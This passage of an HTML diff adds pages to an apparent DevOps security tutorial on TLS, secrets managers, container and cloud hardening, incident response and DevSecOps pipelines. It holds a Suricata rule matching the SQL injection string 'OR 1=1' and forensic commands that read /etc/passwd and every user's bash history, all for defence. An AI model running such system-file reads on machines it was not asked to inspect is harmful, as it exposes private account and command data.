+<span class="cm"># Alert on SQL injection attempt</span><br>
+<span class="st">alert http any any -&gt; any 80 (</span><br>
+<span class="st">  msg:"SQL Injection Attempt";</span><br>
+<span class="st">  content:"OR 1=1"; nocase;</span><br>
+<span class="st">  sid:1002;)</span><br><br>
+<span class="cm"># Block (IPS mode) port scan</span><br>
+<span class="st">drop tcp any any -&gt; $HOME_NET any (</span><br>
+<span class="st">  detection_filter: track by_src, count 50, seconds 1;</span><br>
+<span class="st">  msg:"Port Scan"; sid:1003;)</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 21: SSL/TLS ════════ -->
+<section class="page" id="ssl-tls">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--cyan)">PAGE 21 — ENCRYPTION</div>
+    <h2 class="page-title" style="color:var(--cyan)">SSL/TLS & OpenSSL</h2>
+    <p class="page-desc">The encryption backbone of the internet. Every HTTPS connection uses TLS. DevOps engineers must know how to set up, verify, and troubleshoot certificates.</p>
+  </div>
+  <div class="bigcard reveal">
+    <div class="bg">🔐</div>
+    <div class="badge tool">Critical Skill</div>
+    <div class="bigcard-title">SSL/TLS: The Encryption Handshake</div>
+    <div class="layman"><span class="layman-label">Layman Explanation</span>When you visit https://bank.com, before any data is sent, your browser and the bank do a "handshake" — like a secret greeting that proves the bank is real (not a fake site) and sets up an encrypted tunnel. Nobody between you and the bank can read the data. This is TLS. SSL is the old, broken version. Always use TLS 1.2 or 1.3 minimum.</div>
+  </div>
+  <div class="grid reveal">
+    <div class="card cyan">
+      <div class="badge core">OpenSSL Commands</div>
+      <div class="card-title">Essential OpenSSL Usage</div>
+      <div class="code">
+<span class="cm"># Generate a private key (RSA 4096-bit)</span><br>
+<span class="fl">openssl</span> genrsa <span class="fl">-out</span> private.key 4096<br><br>
+<span class="cm"># Generate self-signed certificate (for testing)</span><br>
+<span class="fl">openssl</span> req <span class="fl">-x509</span> <span class="fl">-new</span> <span class="fl">-key</span> private.key \<br>
+  <span class="fl">-out</span> cert.pem <span class="fl">-days</span> 365<br><br>
+<span class="cm"># Generate CSR (for real CA signing)</span><br>
+<span class="fl">openssl</span> req <span class="fl">-new</span> <span class="fl">-key</span> private.key <span class="fl">-out</span> server.csr<br><br>
+<span class="cm"># View certificate details</span><br>
+<span class="fl">openssl</span> x509 <span class="fl">-in</span> cert.pem <span class="fl">-text</span> <span class="fl">-noout</span><br><br>
+<span class="cm"># Check certificate expiry date</span><br>
+<span class="fl">openssl</span> x509 <span class="fl">-in</span> cert.pem <span class="fl">-noout</span> <span class="fl">-dates</span><br><br>
+<span class="cm"># Test SSL connection</span><br>
+<span class="fl">openssl</span> s_client <span class="fl">-connect</span> google.com:443<br><br>
+<span class="cm"># Check remote cert expiry</span><br>
+<span class="fl">echo</span> | <span class="fl">openssl</span> s_client <span class="fl">-connect</span> domain.com:443 2&gt;/dev/null \<br>
+  | <span class="fl">openssl</span> x509 <span class="fl">-noout</span> <span class="fl">-dates</span>
+      </div>
+    </div>
+    <div class="card cyan">
+      <div class="badge core">Let's Encrypt</div>
+      <div class="card-title">Free SSL with Certbot</div>
+      <div class="layman"><span class="layman-label">Layman</span>Let's Encrypt gives free, trusted SSL certificates. Certbot automates getting and renewing them. There's no excuse for HTTP-only websites anymore — free certificates take 5 minutes to set up.</div>
+      <div class="code">
+<span class="cm"># Install certbot (nginx)</span><br>
+<span class="fl">sudo</span> apt install certbot python3-certbot-nginx<br><br>
+<span class="cm"># Get certificate + auto-configure nginx</span><br>
+<span class="fl">sudo</span> certbot <span class="fl">--nginx</span> <span class="fl">-d</span> yourdomain.com<br><br>
+<span class="cm"># Get cert only (manual nginx config)</span><br>
+<span class="fl">sudo</span> certbot certonly <span class="fl">--nginx</span> <span class="fl">-d</span> yourdomain.com<br><br>
+<span class="cm"># Test auto-renewal</span><br>
+<span class="fl">sudo</span> certbot renew <span class="fl">--dry-run</span><br><br>
+<span class="cm"># Certs stored at:</span><br>
+<span class="cm"># /etc/letsencrypt/live/yourdomain.com/</span><br>
+<span class="cm">#   fullchain.pem  (cert + chain)</span><br>
+<span class="cm">#   privkey.pem    (private key — keep safe!)</span>
+      </div>
+      <div class="alert success">✓ Certbot auto-renews every 90 days via a cron job. Set it and forget it.</div>
+    </div>
+    <div class="card cyan">
+      <div class="badge hot">Testing</div>
+      <div class="card-title">SSL Testing Tools</div>
+      <div class="code">
+<span class="cm"># Online SSL test (grade your config)</span><br>
+<span class="cm"># ssllabs.com/ssltest — aims for A+</span><br><br>
+<span class="cm"># testssl.sh — local testing tool</span><br>
+<span class="fl">sudo</span> apt install testssl.sh<br>
+<span class="fl">testssl.sh</span> https://your-domain.com<br><br>
+<span class="cm"># Check for weak protocols</span><br>
+<span class="fl">nmap</span> <span class="fl">--script ssl-enum-ciphers</span> <span class="fl">-p</span> 443 domain.com<br><br>
+<span class="cm"># Nginx SSL hardening config:</span><br>
+<span class="st">ssl_protocols TLSv1.2 TLSv1.3;</span>   <span class="cm"># disable old SSL/TLS</span><br>
+<span class="st">ssl_ciphers HIGH:!aNULL:!MD5;</span><br>
+<span class="st">ssl_prefer_server_ciphers on;</span><br>
+<span class="st">add_header Strict-Transport-Security "max-age=31536000";</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 22: SECRETS MANAGEMENT ════════ -->
+<section class="page" id="secrets">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--green)">PAGE 22 — SECRETS MANAGEMENT</div>
+    <h2 class="page-title" style="color:var(--green)">Secrets Management</h2>
+    <p class="page-desc">API keys, passwords, and certificates in code = the #1 DevOps security mistake. Here's how to do it right.</p>
+  </div>
+  <div class="banner reveal">
+    <div class="banner-icon">🗝️</div>
+    <div>
+      <div class="banner-title">The #1 DevOps Security Mistake</div>
+      <div class="banner-text">Every year, thousands of developers accidentally commit API keys, database passwords, and SSH keys to GitHub. GitHub scans for these automatically now, but it's too late — bots scrape new commits in seconds. Never commit secrets. Period. Use a proper secrets manager.</div>
+    </div>
+  </div>
+  <div class="grid reveal">
+    <div class="card">
+      <div class="badge hot">Prevention First</div>
+      <div class="card-title">git-secrets & Pre-commit Hooks</div>
+      <div class="layman"><span class="layman-label">Layman</span>git-secrets scans your code BEFORE you commit — like spell check but for secrets. If it finds an AWS key, database URL, or private key, it refuses to let you commit. Install it globally and forget about accidental leaks.</div>
+      <div class="code">
+<span class="cm"># Install git-secrets</span><br>
+<span class="fl">sudo</span> apt install git-secrets<br>
+<span class="cm"># or: brew install git-secrets</span><br><br>
+<span class="cm"># Register AWS patterns (blocks AWS keys)</span><br>
+<span class="fl">git secrets</span> <span class="fl">--register-aws</span><br><br>
+<span class="cm"># Install globally (all repos)</span><br>
+<span class="fl">git secrets</span> <span class="fl">--install</span> ~/.git-templates/git-secrets<br>
+<span class="fl">git config</span> <span class="fl">--global</span> init.templateDir ~/.git-templates/git-secrets<br><br>
+<span class="cm"># Scan existing repo for secrets</span><br>
+<span class="fl">git secrets</span> <span class="fl">--scan</span><br>
+<span class="fl">git secrets</span> <span class="fl">--scan-history</span>  <span class="cm"># scan all commits!</span><br><br>
+<span class="cm"># Also try: trufflehog (finds secrets in git history)</span><br>
+<span class="fl">pip</span> install trufflehog<br>
+<span class="fl">trufflehog</span> git https://github.com/yourrepo
+      </div>
+    </div>
+    <div class="card">
+      <div class="badge core">Best Practice</div>
+      <div class="card-title">HashiCorp Vault</div>
+      <div class="layman"><span class="layman-label">Layman</span>Vault is a secret bank vault for your infrastructure. Instead of hardcoding passwords, apps ask Vault "give me the DB password" with their identity token. Vault gives a temporary secret that expires. If breached, the secret is already expired. Centralized, audited, and secure.</div>
+      <div class="code">
+<span class="cm"># Start Vault dev server (learning)</span><br>
+<span class="fl">vault</span> server <span class="fl">-dev</span><br><br>
+<span class="cm"># Store a secret</span><br>
+<span class="fl">vault</span> kv put secret/myapp \<br>
+  db_password=<span class="st">"supersecret"</span> \<br>
+  api_key=<span class="st">"key123"</span><br><br>
+<span class="cm"># Read a secret</span><br>
+<span class="fl">vault</span> kv get secret/myapp<br><br>
+<span class="cm"># Read specific field</span><br>
+<span class="fl">vault</span> kv get <span class="fl">-field</span>=db_password secret/myapp<br><br>
+<span class="cm"># Dynamic secrets (DB: create temp credentials)</span><br>
+<span class="fl">vault</span> read database/creds/my-role<br>
+<span class="cm"># Returns: username + temp password (TTL: 1hr)</span>
+      </div>
+    </div>
+    <div class="card">
+      <div class="badge tool">Cloud Native</div>
+      <div class="card-title">Cloud Secrets Managers</div>
+      <div class="code">
+<span class="cm"># AWS Secrets Manager</span><br>
+<span class="fl">aws secretsmanager</span> create-secret \<br>
+  <span class="fl">--name</span> prod/myapp/db \<br>
+  <span class="fl">--secret-string</span> <span class="st">'{"password":"mypass"}'</span><br><br>
+<span class="fl">aws secretsmanager</span> get-secret-value \<br>
+  <span class="fl">--secret-id</span> prod/myapp/db<br><br>
+<span class="cm"># GCP Secret Manager</span><br>
+<span class="fl">gcloud secrets</span> create my-secret \<br>
+  <span class="fl">--data-file</span>=secret.txt<br>
+<span class="fl">gcloud secrets</span> versions access latest \<br>
+  <span class="fl">--secret</span>=my-secret<br><br>
+<span class="cm"># Azure Key Vault</span><br>
+<span class="fl">az keyvault secret set</span> <span class="fl">--vault-name</span> myvault \<br>
+  <span class="fl">--name</span> db-password <span class="fl">--value</span> <span class="st">"mysecret"</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 23: CONTAINER SEC ════════ -->
+<section class="page" id="container-sec">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--cyan)">PAGE 23 — CONTAINER SECURITY</div>
+    <h2 class="page-title" style="color:var(--cyan)">Docker & Container Security</h2>
+    <p class="page-desc">Containers changed DevOps but introduced new attack surfaces. Secure your Docker images, runtime, and Kubernetes clusters.</p>
+  </div>
+  <div class="grid reveal">
+    <div class="card cyan">
+      <div class="badge hot">Image Security</div>
+      <div class="card-title">Trivy — Container Image Scanning</div>
+      <div class="layman"><span class="layman-label">Layman</span>Your Docker image is built on top of Ubuntu or Alpine — those base images have software with known vulnerabilities (CVEs). Trivy scans every layer of your image and reports: "You have nginx 1.14 which has CVE-2019-1234 (Critical)." Fix it before pushing to production.</div>
+      <div class="code">
+<span class="cm"># Install Trivy</span><br>
+<span class="fl">sudo</span> apt install trivy<br><br>
+<span class="cm"># Scan a Docker image</span><br>
+<span class="fl">trivy image</span> nginx:latest<br><br>
+<span class="cm"># Scan your custom image</span><br>
+<span class="fl">trivy image</span> myapp:v1.0<br><br>
+<span class="cm"># Only show critical/high vulns</span><br>
+<span class="fl">trivy image</span> <span class="fl">--severity</span> CRITICAL,HIGH myapp:v1<br><br>
+<span class="cm"># Scan filesystem (code vulns)</span><br>
+<span class="fl">trivy fs</span> .<br><br>
+<span class="cm"># Scan IaC configs (Terraform, K8s YAML)</span><br>
+<span class="fl">trivy config</span> ./k8s/<br><br>
+<span class="cm"># CI/CD: fail build if critical vulns found</span><br>
+<span class="fl">trivy image</span> <span class="fl">--exit-code</span> 1 <span class="fl">--severity</span> CRITICAL myapp:v1
+      </div>
+    </div>
+    <div class="card cyan">
+      <div class="badge hot">Runtime Security</div>
+      <div class="card-title">Docker Security Hardening</div>
+      <div class="code">
+<span class="cm"># 1. Run as non-root (Dockerfile)</span><br>
+<span class="fl">RUN</span> adduser <span class="fl">-D</span> appuser<br>
+<span class="fl">USER</span> appuser<br><br>
+<span class="cm"># 2. Read-only filesystem</span><br>
+<span class="fl">docker run</span> <span class="fl">--read-only</span> myapp<br><br>
+<span class="cm"># 3. Drop all capabilities</span><br>
+<span class="fl">docker run</span> <span class="fl">--cap-drop=ALL</span> myapp<br><br>
+<span class="cm"># 4. Limit resources (prevent DoS)</span><br>
+<span class="fl">docker run</span> <span class="fl">--memory="256m"</span> <span class="fl">--cpus="0.5"</span> myapp<br><br>
+<span class="cm"># 5. No new privileges</span><br>
+<span class="fl">docker run</span> <span class="fl">--security-opt</span> no-new-privileges myapp<br><br>
+<span class="cm"># 6. Scan before run</span><br>
+<span class="fl">trivy image</span> myapp:latest &amp;&amp; <span class="fl">docker run</span> myapp<br><br>
+<span class="cm"># 7. Use Docker Bench for security audit</span><br>
+<span class="fl">docker run</span> --rm <span class="fl">-it</span> \<br>
+  docker/docker-bench-security
+      </div>
+    </div>
+    <div class="card cyan">
+      <div class="badge adv">Kubernetes Security</div>
+      <div class="card-title">K8s Security Basics</div>
+      <div class="layman"><span class="layman-label">Layman</span>Kubernetes has its own security concepts: RBAC controls who can do what, NetworkPolicies work like firewall rules between pods, and Pod Security Standards prevent containers from running as root.</div>
+      <div class="code">
+<span class="cm"># Check K8s security with kube-bench</span><br>
+<span class="fl">kubectl apply</span> <span class="fl">-f</span> https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml<br><br>
+<span class="cm"># Check RBAC permissions</span><br>
+<span class="fl">kubectl auth can-i</span> list pods <span class="fl">--as</span> system:serviceaccount:default:default<br><br>
+<span class="cm"># List all ClusterRoleBindings</span><br>
+<span class="fl">kubectl get</span> clusterrolebindings<br><br>
+<span class="cm"># NetworkPolicy to isolate pod</span><br>
+<span class="cm"># Only allow traffic from frontend to backend:</span><br>
+<span class="st">apiVersion: networking.k8s.io/v1</span><br>
+<span class="st">kind: NetworkPolicy</span><br>
+<span class="st">spec:</span><br>
+<span class="st">  podSelector:</span><br>
+<span class="st">    matchLabels: {app: backend}</span><br>
+<span class="st">  ingress:</span><br>
+<span class="st">  - from:</span><br>
+<span class="st">    - podSelector: {app: frontend}</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 24: CLOUD SEC ════════ -->
+<section class="page" id="cloud-sec">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--cyan)">PAGE 24 — CLOUD SECURITY</div>
+    <h2 class="page-title" style="color:var(--cyan)">Cloud Security (AWS/GCP/Azure)</h2>
+    <p class="page-desc">Cloud misconfigurations are responsible for the majority of modern breaches. The most dangerous ones are all easily preventable.</p>
+  </div>
+  <div class="banner cyan reveal">
+    <div class="banner-icon">☁️</div>
+    <div>
+      <div class="banner-title">The Shared Responsibility Model</div>
+      <div class="banner-text">Cloud providers (AWS/GCP/Azure) secure the physical infrastructure. YOU are responsible for securing everything on top — IAM, network config, encryption, application security, data. "My data is on AWS" ≠ "My data is safe." Misconfigured S3 buckets have leaked data from thousands of companies.</div>
+    </div>
+  </div>
+  <div class="grid reveal">
+    <div class="card cyan">
+      <div class="badge hot">Critical</div>
+      <div class="card-title">AWS Security Essentials</div>
+      <div class="code">
+<span class="cm"># Enable AWS CloudTrail (audit log of all API calls)</span><br>
+<span class="fl">aws cloudtrail</span> create-trail \<br>
+  <span class="fl">--name</span> my-trail \<br>
+  <span class="fl">--s3-bucket-name</span> my-audit-bucket<br>
+<span class="fl">aws cloudtrail</span> start-logging <span class="fl">--name</span> my-trail<br><br>
+<span class="cm"># Check S3 bucket public access (DANGER check)</span><br>
+<span class="fl">aws s3api</span> get-bucket-acl <span class="fl">--bucket</span> mybucket<br>
+<span class="fl">aws s3api</span> get-public-access-block <span class="fl">--bucket</span> mybucket<br><br>
+<span class="cm"># Block all public S3 access</span><br>
+<span class="fl">aws s3api</span> put-public-access-block \<br>
+  <span class="fl">--bucket</span> mybucket \<br>
+  <span class="fl">--public-access-block-configuration</span> \<br>
+  <span class="st">"BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"</span><br><br>
+<span class="cm"># List all IAM users</span><br>
+<span class="fl">aws iam</span> list-users<br>
+<span class="cm"># Check for unused access keys (rotate/delete)</span><br>
+<span class="fl">aws iam</span> get-credential-report
+      </div>
+    </div>
+    <div class="card cyan">
+      <div class="badge core">IAM Security</div>
+      <div class="card-title">Identity & Access Management</div>
+      <div class="layman"><span class="layman-label">Layman</span>IAM is the permission system for everything in the cloud. The golden rule: least privilege — give every service, user, and role only the minimum permissions needed. Most cloud breaches start with an over-permissioned IAM role.</div>
+      <ul class="cl c">
+        <li>Enable MFA on root account and all admin users</li>
+        <li>Never use root account for day-to-day work</li>
+        <li>Use IAM roles for EC2/Lambda — not access keys in code!</li>
+        <li>Rotate access keys every 90 days, delete unused ones</li>
+        <li>Enable AWS GuardDuty / GCP Security Command Center</li>
+        <li>Use SCPs (Service Control Policies) to enforce org-wide limits</li>
+        <li>Enable Access Analyzer to find overly permissive policies</li>
+      </ul>
+      <div class="alert warn">⚠️ An S3 bucket accidentally set to public has leaked millions of customer records from Fortune 500 companies. Always verify S3 public access settings.</div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 25: INCIDENT RESPONSE ════════ -->
+<section class="page" id="incident">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--red)">PAGE 25 — INCIDENT RESPONSE</div>
+    <h2 class="page-title" style="color:var(--red)">Incident Response</h2>
+    <p class="page-desc">When you get breached — and you will — having a plan is everything. Speed of response determines how bad it gets.</p>
+  </div>
+  <div class="bigcard reveal">
+    <div class="bg">🚨</div>
+    <div class="badge hot">Emergency Playbook</div>
+    <div class="bigcard-title">The 6 Phases of Incident Response</div>
+    <div class="steps" style="margin-top:1.5rem;">
+      <div class="step"><div class="step-dot r">1</div><div class="step-body"><div class="st-title">Preparation</div><div class="st-desc">BEFORE an incident: backups tested, SIEM configured, IR plan documented, communication tree ready, tools pre-installed.</div></div></div>
+      <div class="step"><div class="step-dot r">2</div><div class="step-body"><div class="st-title">Identification</div><div class="st-desc">Detect that something is wrong. Alert from SIEM, unusual login, customer complaint, IDS alert, anomalous traffic pattern.</div></div></div>
+      <div class="step"><div class="step-dot r">3</div><div class="step-body"><div class="st-title">Containment</div><div class="st-desc">Stop the bleeding. Isolate affected systems. Block attacker's IP. Disable compromised accounts. Don't let it spread.</div></div></div>
+      <div class="step"><div class="step-dot r">4</div><div class="step-body"><div class="st-title">Eradication</div><div class="st-desc">Remove the threat. Find and delete malware. Close the vulnerability. Rebuild compromised systems from clean backups.</div></div></div>
+      <div class="step"><div class="step-dot r">5</div><div class="step-body"><div class="st-title">Recovery</div><div class="st-desc">Restore systems to normal operation. Verify no backdoors remain. Monitor closely. Gradually restore services.</div></div></div>
+      <div class="step"><div class="step-dot r">6</div><div class="step-body"><div class="st-title">Lessons Learned</div><div class="st-desc">Post-mortem: What happened? How? What failed? Update playbooks, patch gaps, improve monitoring. Share (internally) what happened.</div></div></div>
+    </div>
+  </div>
+  <div class="grid reveal">
+    <div class="card red">
+      <div class="badge hot">Under Attack Commands</div>
+      <div class="card-title">Immediate Response Commands</div>
+      <div class="code">
+<span class="cm"># Who is connected RIGHT NOW?</span><br>
+<span class="fl">who</span><br>
+<span class="fl">w</span>             <span class="cm"># detailed: IP + time + command</span><br>
+<span class="fl">last</span>          <span class="cm"># recent logins history</span><br>
+<span class="fl">lastb</span>         <span class="cm"># failed login attempts</span><br><br>
+<span class="cm"># What processes are running?</span><br>
+<span class="fl">ps aux</span><br>
+<span class="fl">top</span><br>
+<span class="cm"># Suspicious? Check what it is:</span><br>
+<span class="fl">ls</span> <span class="fl">-la</span> /proc/&lt;PID&gt;/exe<br><br>
+<span class="cm"># What network connections exist?</span><br>
+<span class="fl">ss</span> <span class="fl">-tulpn</span>     <span class="cm"># all connections</span><br>
+<span class="fl">netstat</span> <span class="fl">-anp</span>  <span class="cm"># with process names</span><br><br>
+<span class="cm"># Block attacker IP immediately</span><br>
+<span class="fl">sudo</span> ufw deny from ATTACKER_IP<br>
+<span class="fl">sudo</span> iptables <span class="fl">-A</span> INPUT <span class="fl">-s</span> ATTACKER_IP <span class="fl">-j</span> DROP<br><br>
+<span class="cm"># Kill suspicious process</span><br>
+<span class="fl">sudo</span> kill <span class="fl">-9</span> &lt;PID&gt;<br><br>
+<span class="cm"># Disable compromised user account</span><br>
+<span class="fl">sudo</span> usermod <span class="fl">-L</span> compromised_user
+      </div>
+    </div>
+    <div class="card red">
+      <div class="badge core">Forensics</div>
+      <div class="card-title">Post-Incident Investigation</div>
+      <div class="code">
+<span class="cm"># Check recently modified files (last 24h)</span><br>
+<span class="fl">find</span> / <span class="fl">-mtime</span> <span class="fl">-1</span> <span class="fl">-type</span> f 2&gt;/dev/null<br><br>
+<span class="cm"># Check for SUID binaries (privilege escalation)</span><br>
+<span class="fl">find</span> / <span class="fl">-perm</span> <span class="fl">-4000</span> <span class="fl">-type</span> f 2&gt;/dev/null<br><br>
+<span class="cm"># Check crontabs for persistence</span><br>
+<span class="fl">crontab</span> <span class="fl">-l</span>           <span class="cm"># current user</span><br>
+<span class="fl">sudo</span> crontab <span class="fl">-l</span>      <span class="cm"># root</span><br>
+<span class="fl">cat</span> /etc/cron*<br><br>
+<span class="cm"># Check /tmp for dropped malware</span><br>
+<span class="fl">ls</span> <span class="fl">-la</span> /tmp/<br><br>
+<span class="cm"># Look for new user accounts</span><br>
+<span class="fl">cat</span> /etc/passwd | tail <span class="fl">-20</span><br><br>
+<span class="cm"># Check bash history</span><br>
+<span class="fl">cat</span> ~/.bash_history<br>
+<span class="fl">cat</span> /home/*/.bash_history
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 26: DEVSECOPS ════════ -->
+<section class="page" id="devsecops">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--green)">PAGE 26 — DEVSECOPS</div>
+    <h2 class="page-title" style="color:var(--green)">DevSecOps — Security in CI/CD</h2>
+    <p class="page-desc">Shift security left. Don't bolt it on at the end — bake it into every step of your pipeline.</p>
+  </div>
+  <div class="bigcard reveal">
+    <div class="bg">⚙️</div>
+    <div class="badge core">Modern Practice</div>
+    <div class="bigcard-title">The DevSecOps Pipeline</div>
+    <div class="layman"><span class="layman-label">Layman Explanation</span>Traditional security: "Build everything, test at the end, security team reviews in week 12." DevSecOps: security runs automatically at every step — when you write code (IDE plugins), when you commit (pre-commit hooks), when CI runs (SAST/DAST), when you build containers (image scanning), when you deploy (config auditing). Finding a bug in week 1 costs $10. Finding it in production costs $10,000.</div>
+    <div class="flow" style="flex-wrap:wrap;margin-top:1.5rem;">
+      <div class="fs" style="border-color:rgba(0,255,136,0.3);color:var(--green)">Code → IDE Security</div><div class="fa">→</div>
+      <div class="fs" style="border-color:rgba(0,255,136,0.3);color:var(--green)">Pre-commit Hooks</div><div class="fa">→</div>
+      <div class="fs" style="border-color:rgba(0,212,255,0.3);color:var(--cyan)">SAST (Static Analysis)</div><div class="fa">→</div>
+      <div class="fs" style="border-color:rgba(0,212,255,0.3);color:var(--cyan)">SCA (Dependencies)</div><div class="fa">→</div>
+      <div class="fs" style="border-color:rgba(255,204,0,0.3);color:var(--yellow)">Container Scan</div><div class="fa">→</div>
+      <div class="fs" style="border-color:rgba(255,51,85,0.3);color:var(--red)">DAST (Dynamic)</div><div class="fa">→</div>
+      <div class="fs" style="border-color:rgba(0,255,136,0.3);color:var(--green)">Deploy + Monitor</div>
+    </div>
+  </div>
+  <div class="grid reveal">
+    <div class="card">
+      <div class="badge tool">SAST Tools</div>
+      <div class="card-title">Static Analysis (Code Scanning)</div>
+      <div class="layman"><span class="layman-label">Layman</span>SAST reads your code without running it and finds security issues — like a code reviewer who knows every security anti-pattern. Finds SQL injection, hardcoded secrets, XSS, insecure functions before the code even runs.</div>
+      <div class="code">
+<span class="cm"># Semgrep (multilingual, fast, free)</span><br>
+<span class="fl">pip</span> install semgrep<br>
+<span class="fl">semgrep</span> <span class="fl">--config</span>=<span class="st">"p/security-audit"</span> .<br>
+<span class="fl">semgrep</span> <span class="fl">--config</span>=<span class="st">"p/owasp-top-ten"</span> .<br><br>
+<span class="cm"># Bandit (Python security linter)</span><br>
+<span class="fl">pip</span> install bandit<br>
+<span class="fl">bandit</span> <span class="fl">-r</span> ./src/<br><br>
+<span class="cm"># Safety (Python dependency check)</span><br>
+<span class="fl">pip</span> install safety<br>
+<span class="fl">safety check</span><br><br>
+<span class="cm"># npm audit (Node.js dependencies)</span><br>
+<span class="fl">npm audit</span><br>
+<span class="fl">npm audit fix</span>
+      </div>
+    </div>
+    <div class="card">
+      <div class="badge tool">GitHub Actions</div>
+      <div class="card-title">Security in CI/CD Pipeline</div>
+      <div class="code">
+<span class="cm"># .github/workflows/security.yml</span><br>
+<span class="st">name:</span> Security Scan<br>
+<span class="st">on:</span> [push, pull_request]<br>
+<span class="st">jobs:</span><br>
+&nbsp;&nbsp;<span class="st">security:</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="st">runs-on:</span> ubuntu-latest<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="st">steps:</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;- <span class="st">uses:</span> actions/checkout@v3<br><br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># Secrets scan</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;- <span class="st">uses:</span> trufflesecurity/trufflehog@main<br><br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># SAST scan</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;- <span class="st">uses:</span> returntocorp/semgrep-action@v1<br><br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># Container scan</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;- <span class="st">uses:</span> aquasecurity/trivy-action@master<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="st">with:</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="st">image-ref:</span> myapp:latest<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="st">exit-code:</span> <span class="st">'1'</span>  <span class="cm"># fail on critical</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 27: MASTER CHECKLIST ════════ -->
+<section class="page" id="checklist">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--green)">PAGE 27 — MASTERY CHECKLIST</div>
+    <h2 class="page-title" style="color:var(--green)">The Ultimate DevOps Security Checklist</h2>
+    <p class="page-desc">Your complete step-by-step learning path. Master these in order. Check them off as you go.</p>
+  </div>
+
+  <div class="bigcard reveal">
+    <div class="bg">🎯</div>
+    <div class="bigcard-title">📋 Recommended Learning Order</div>
+    <div class="steps">
+      <div class="step"><div class="step-dot">1</div><div class="step-body"><div class="st-title">Networking Fundamentals</div><div class="st-desc">TCP/IP, ports, protocols, subnetting — Week 1. Without this, nothing else makes sense.</div></div></div>
+      <div class="step"><div class="step-dot c">2</div><div class="step-body"><div class="st-title">Linux Security Basics</div><div class="st-desc">Users, permissions, SSH hardening, log reading — Week 2. Your foundation for everything.</div></div></div>
+      <div class="step"><div class="step-dot c">3</div><div class="step-body"><div class="st-title">Reconnaissance Tools</div><div class="st-desc">Nmap + Wireshark/tcpdump — Week 3-4. Learn to see your own infrastructure through an attacker's eyes.</div></div></div>
+      <div class="step"><div class="step-dot y">4</div><div class="step-body"><div class="st-title">Defensive Tools</div><div class="st-desc">UFW/iptables + fail2ban + SSL/TLS — Week 5-6. Harden everything you've exposed.</div></div></div>
+      <div class="step"><div class="step-dot r">5</div><div class="step-body"><div class="st-title">Offensive Tools (on your own systems!)</div><div class="st-desc">Burp Suite + Nikto + SQLMap + Gobuster — Week 7-8. Attack your own apps to find holes before others do.</div></div></div>
+      <div class="step"><div class="step-dot y">6</div><div class="step-body"><div class="st-title">Monitoring & Detection</div><div class="st-desc">SIEM + Suricata IDS — Week 9-10. You can't defend what you can't see.</div></div></div>
+      <div class="step"><div class="step-dot">7</div><div class="step-body"><div class="st-title">Secrets & Container Security</div><div class="st-desc">Vault + Trivy + Docker hardening — Week 11-12. Modern DevOps-specific security.</div></div></div>
+      <div class="step"><div class="step-dot c">8</div><div class="step-body"><div class="st-title">DevSecOps Pipeline Integration</div><div class="st-desc">Embed security in CI/CD — Week 13-14. Automate everything you've learned.</div></div></div>
+    </div>
+  </div>
+
+  <div class="grid-2 reveal" style="margin-top:1.5rem;">
+    <div style="background:var(--card);border:1px solid rgba(0,255,136,0.2);border-radius:10px;padding:2rem;">
+      <div style="font-family:'Orbitron',monospace;font-size:0.8rem;color:var(--green);margin-bottom:1rem;">✅ SERVER HARDENING CHECKLIST</div>
+      <ul class="cl">
+        <li>SSH key auth only — password auth disabled</li>
+        <li>Root SSH login disabled</li>
+        <li>SSH on non-default port</li>
+        <li>fail2ban installed and configured</li>
+        <li>UFW firewall enabled, only necessary ports open</li>
+        <li>All software up to date (auto-updates enabled)</li>
+        <li>No databases/services exposed to internet</li>
+        <li>Log shipping to central SIEM configured</li>
+        <li>Regular backups tested (not just taken)</li>
+        <li>SSL/TLS A+ grade (ssllabs.com test)</li>
+        <li>HSTS header enabled</li>
+        <li>No sensitive info in HTTP headers</li>
+        <li>Nmap scan: only expected ports open</li>
+        <li>Nikto scan: no critical findings</li>
+      </ul>
+    </div>
+    <div style="background:var(--card);border:1px solid rgba(0,212,255,0.2);border-radius:10px;padding:2rem;">
+      <div style="font-family:'Orbitron',monospace;font-size:0.8rem;color:var(--cyan);margin-bottom:1rem;">✅ DEVSECOPS PIPELINE CHECKLIST</div>
+      <ul class="cl c">
+        <li>git-secrets / pre-commit hooks installed</li>
+        <li>SAST (Semgrep/Bandit) in CI pipeline</li>
+        <li>SCA: npm audit / safety check running</li>
+        <li>Container images scanned with Trivy</li>
+        <li>Trivy configured to fail on CRITICAL CVEs</li>
+        <li>Secrets stored in Vault/AWS SM — NOT code</li>
